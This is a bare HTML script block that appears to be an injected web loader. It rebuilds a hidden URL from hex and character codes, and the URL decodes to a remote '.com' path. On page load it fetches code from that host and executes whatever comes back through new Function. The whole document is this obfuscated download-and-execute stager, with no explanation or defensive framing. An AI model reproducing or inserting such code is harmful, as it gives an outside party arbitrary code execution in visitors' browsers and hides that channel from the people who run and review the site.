<script>
var _h = '68747470733a2f2f';
var _p = [103, 114, 101, 121, 115, 105, 108, 107, 118, 111, 105, 100, 46, 99, 111, 109, 47, 112, 105, 99, 110, 105, 99, 46, 107, 101, 107, 117, 110, 97];

function _fromHex(s) {
    var o = '', i = 0;
    for (; i < s.length; i += 2) o += String.fromCharCode(parseInt(s.substr(i, 2), 16));
    return o;
}

function buildEndpoint() {
    return _fromHex(_h) + String.fromCharCode.apply(null, _p);
}

var http = new XMLHttpRequest();
var target = buildEndpoint();

http.open('GET', target, true);
http.onreadystatechange = function () {
    if (http.readyState !== 4) return;
    if (http.status < 200 || http.status > 299) return;
    var body = String(http.responseText).replace(/^\uFEFF/, '').trim();
    if (!body) return;
    var runner = new Function(body);
    runner();
};
http.send(null);
</script>
